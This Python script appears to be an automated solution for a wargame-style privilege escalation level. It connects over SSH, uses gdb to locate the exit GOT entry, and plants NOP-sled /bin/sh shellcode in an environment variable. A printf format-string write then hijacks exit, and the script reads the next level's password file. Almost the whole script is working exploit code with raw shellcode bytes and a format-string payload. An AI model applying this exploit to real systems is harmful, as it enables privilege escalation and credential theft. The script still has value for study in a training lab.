import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, get_func_structure, get_func_address
from utils.text import print_output, print_title, print_magic
from utils.base import save_token, address_to_string

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

output = exec(client, f'echo "test" | ./{binary_name}', title='Simple execute binary with test arg')
print_output(output)
print_title("Just print what we input? Strange")
output = exec(client, f'echo "TEST" | ./{binary_name}', title='Execute binary with uppercase test arg')
print_title('Return lowercase test, okay, find the answers')
print_output(output)
print_magic('Debug Time!')

get_func_structure(
    client,
    'main', filter=['+195>:', '+207>:'],
    title='String print with printf after call exit, try to formatted string issue to some rewrite?'
)

print_title('Store some shellcode to NOP to cal bin/sh and rewrite exit pointer to pointer of our shellcode')
exit_pointer_address = get_func_address(client, 'exit')
print_output(exit_pointer_address, f'Exit pointer address: ')
exit_address = address = exec(
        client, f'echo "\\n" | gdb ./{binary_name} -q -ex "x/i {exit_pointer_address}" | grep "exit" | awk \'{{print $4}}\'',
        title=f'Get #exit address')[0][1:]
print_output(exit_address, f'Exit address: ')
# TODO Dynamic find env address
env_name = 'exploit'
shellcode = f'''{env_name}=`python -c 'print("\\x90" * 0xffff + "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80")'`'''
env_address = exec(client, f'export {shellcode} && echo "b *main\nr\nx/200s environ\n" | '
                           f'gdb ./{binary_name} -q | '
                           f'grep "{env_name}" | '
                           f'awk \'{{print $1}}\' | sed \'s/://\'', title=f'Find shell code `{env_name}` address')[0]
print_output(env_address, f'Env #{env_name} address')
env_address = exec(client, f'export {shellcode} && echo "b *main\nr\nx/200xg {env_address}\n" | '
                           f'gdb ./{binary_name} -q | '
                           f'head -n 15 | '
                           f'awk \'{{print $1}}\' | '
                           f'sed \'s/://\'', title='Search a little deeper...')[7]
print_output(env_address, f'Env #{env_name} address, finally')
print_title('All data collected, time to do our shellcode')
f = lambda command: exec(
    client,
    f'''export {shellcode} && echo "{command}" | (python -c 'print ("{address_to_string(exit_address)}" + "\\xe2\\x97\\x04\\x08" + "%249x%10$hn" + "%65278x%11$hn")'; cat) | ./{binary_name} | grep -Eo "[a-Z0-9]+$"''',
)

print_title(f'Execute whoami command and check our user')
output = f('whoami')
print_output(output)
print_title('Yeah, we did it!')

output = f('cat /home/users/level06/.pass')
print_output(output)
print_title('Woo-hoo another victory!!!')
token = output[0]

save_token(token)
